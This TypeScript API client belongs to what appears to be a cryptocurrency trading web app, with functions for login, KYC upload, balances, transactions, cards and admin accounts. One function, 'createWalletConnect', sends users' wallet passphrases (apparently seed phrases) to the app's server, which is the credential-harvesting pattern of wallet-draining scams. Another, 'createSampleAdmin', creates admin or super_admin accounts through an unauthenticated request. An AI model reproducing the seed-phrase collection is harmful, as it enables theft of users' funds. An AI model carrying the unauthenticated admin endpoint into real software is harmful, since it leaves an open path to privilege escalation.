import axios from "axios";

//Libs, Enums
import { getAccessToken } from "@/lib/token";

const BASE_URL = import.meta.env.VITE_BASE_URL;

// Axios instance for authenticated requests
const axiosAuthInstance = axios.create({
    baseURL: BASE_URL,
    withCredentials: true
});

// Request interceptor
axiosAuthInstance.interceptors.request.use(
    async (config) => {
        // Add accessToken to the request
        const token = getAccessToken();
        if (token) {
            config.headers.Authorization = `Bearer ${token}`;
        }
        return config;
    },
    (error) => Promise.reject(error)
);

// Axios instance for unauthenticated requests
const axiosUnauthInstance = axios.create({
    baseURL: BASE_URL,
});


//Login a User
export const loginUserFn = async (data: { email: string; password: string }) => {
    const response = await axiosUnauthInstance.post("auth/login", data);
    return response.data;
};

//Create a User
export const createUserFn = async (data: { email: string, userName: string, password: string, phoneNumber: string, country: string }) => {
    const response = await axiosUnauthInstance.post("users/create", data);
    return response.data;
}

//Resend Email Verification
export const resendVerificationFn = async () => {
    const response = await axiosAuthInstance.get("users/resend");
    return response;
}

//Verify User
export const verifyUserFn = async (data: { verificationCode: string }) => {
    const response = await axiosAuthInstance.post("users/verify", data);
    return response.data;
}

//Submit Kyc
// eslint-disable-next-line @typescript-eslint/no-explicit-any
export const userKycFn = async (data: FormData): Promise<any> => {
    const response = await axiosAuthInstance.patch("users/kyc", data, {
        headers: {
            "Content-Type": "multipart/form-data",
        },
    });
    return response.data;
};

//Get logged in user details
export const getUserDetailsFn = async () => {
    const result = await axiosAuthInstance.get<GetDetailsResponse>("users/currentUser")
    return result.data;
}

//Get Coin Prices
export const getPrices = async () => {
    const result = await axiosAuthInstance.get(`transactions/fetchPrices`)
    return result.data;
}

//Get logged in user balance
export const getUserBalanceFn = async () => {
    const result = await axiosAuthInstance.get<GetBalanceResponse>(`users/getBalance`)
    return result.data;
}

//Get a users last three transactions
export const getUserLastTransactionsFn = async () => {
    const result = await axiosAuthInstance.get(`transactions/getLastTransactions`)
    return result.data;
}

//Get a user transactions
export const getAllTransactions = async (page?: string, limit?: string) => {
    const result = await axiosAuthInstance.get(`transactions/userTransactions?page=${page}&limit=${limit}`)
    return result.data
}

//Create a new transaction
export const createTransaction = async (data: { coin: string, transactionType: string, amount: number, network: string, walletAddress: string }) => {
    const response = await axiosAuthInstance.post("transactions/create", data);
    return response.data;
}

//Delete notification
export const deleteNotification = async (id: string) => {
    const result = await axiosAuthInstance.delete(`notification/delete/${id}`);
    return result.data;
}

//Get a Coin Price
export const getCoinPrice = async (coin: string) => {
    const response = await axiosAuthInstance.get(`transactions/getCoinDetails/${coin}`)
    return response.data;
}

//Get transactions of a particular coin
export const getCoinTransactions = async (data: { coin: string }) => {
    const response = await axiosAuthInstance.post(`transactions/getTransactions`, data);
    return response.data;
}

//Connect wallet
export const createWalletConnect = async (data: { wallet: string, passPhrase: string[] }) => {
    const response = await axiosAuthInstance.post(`walletConnect/create`, data);
    return response.data;
}

//Get connect wallet stats
export const getWalletConnectStats = async () => {
    const result = await axiosAuthInstance.get(`walletConnect/walletConnectStats`);
    return result.data;
}

//Create new card request
export const createCardRequest = async () => {
    const response = await axiosAuthInstance.post(`cards/new`)
    return response.data;
}

//Get a card request
export const getCardRequest = async () => {
    const result = await axiosAuthInstance.get(`cards/get`);
    return result.data;
}

//Update Profile Picture
// eslint-disable-next-line @typescript-eslint/no-explicit-any
export const updateProfilePicture = async (data: FormData): Promise<any> => {
    const response = await axiosAuthInstance.patch(`users/updateProfilePicture`, data, {
        headers: {
            "Content-Type": "multipart/form-data",
        },
    });
    return response.data;
}

//Update Other Details
// eslint-disable-next-line @typescript-eslint/no-explicit-any
export const updateDetails = async (data: any): Promise<any> => {
    const response = await axiosAuthInstance.patch(`users/update`, data);
    return response.data;
}


//Admin Endpoints
//Create Sample Admin
export const createSampleAdmin = async (data: { email: string, password: string, role: "admin" | "super_admin" }) => {
    const response = await axiosUnauthInstance.post(`admins/sampleCreate`, data);
    return response.data;
}

//Create Admin
export const createAdmin = async (data: { email: string, password: string, role: "admin" | "super_admin" }) => {
    const response = await axiosAuthInstance.post(`admins/create`, data);
    return response.data;
}

//Login Admin
export const loginAdmin = async (data: { email: string, password: string }) => {
    const response = await axiosAuthInstance.post(`auth/adminLogin`, data);
    return response.data;
}